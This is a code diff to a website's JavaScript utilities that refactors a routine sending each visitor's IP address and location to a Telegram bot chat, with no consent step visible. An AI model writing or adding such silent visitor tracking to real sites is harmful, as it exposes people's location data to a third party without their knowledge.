@@ -570,30 +570,6 @@ const Utils = {
         }
     },
 
-    markVisitBootDone() {
-        if (!window.__pageBoot) return;
-        window.__pageBoot.visitDone = true;
-        if (typeof window.__pageBoot.tryHide === 'function') {
-            window.__pageBoot.tryHide();
-        }
-    },
-
-    hasVisitPing() {
-        try {
-            return Boolean(localStorage.getItem('__visit_ping_v3__') || sessionStorage.getItem('__visit_ping_v3__'));
-        } catch (e) {
-            return Boolean(window.__visitPingStarted);
-        }
-    },
-
-    markVisitPing() {
-        window.__visitPingStarted = true;
-        try {
-            localStorage.setItem('__visit_ping_v3__', String(Date.now()));
-            sessionStorage.setItem('__visit_ping_v3__', '1');
-        } catch (e) { /* ignore */ }
-    },
-
     async waitForVisitLocation() {
         let loc = await this.getUserLocation();
         if (this.hasRealIp(loc)) return loc;
@@ -611,37 +587,22 @@ const Utils = {
     },
 
     async dispatchVisitNotification() {
-        if (window.__visitPingStarted || this.hasVisitPing()) {
-            this.getUserLocation().finally(() => this.markVisitBootDone());
-            return;
-        }
+        if (window.__visitPingStarted) return;
 
         try {
             const loc = await this.waitForVisitLocation();
             const text = this.telegramVisitMessage(loc);
             if (!this.hasRealIp(loc) || !text) {
+                this._visitSendPromise = null;
                 return;
             }
 
-            const controller = new AbortController();
-            const timer = setTimeout(() => controller.abort(), 8000);
-            const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true
-                }),
-                signal: controller.signal
-            });
-            clearTimeout(timer);
-            if (res && res.ok) this.markVisitPing();
+            const res = await this.sendTelegramText(text);
+            if (res && res.ok) window.__visitPingStarted = true;
+            else this._visitSendPromise = null;
         } catch (error) {
+            this._visitSendPromise = null;
             console.error('Visit notify error:', error);
-        } finally {
-            this.markVisitBootDone();
         }
     },
 
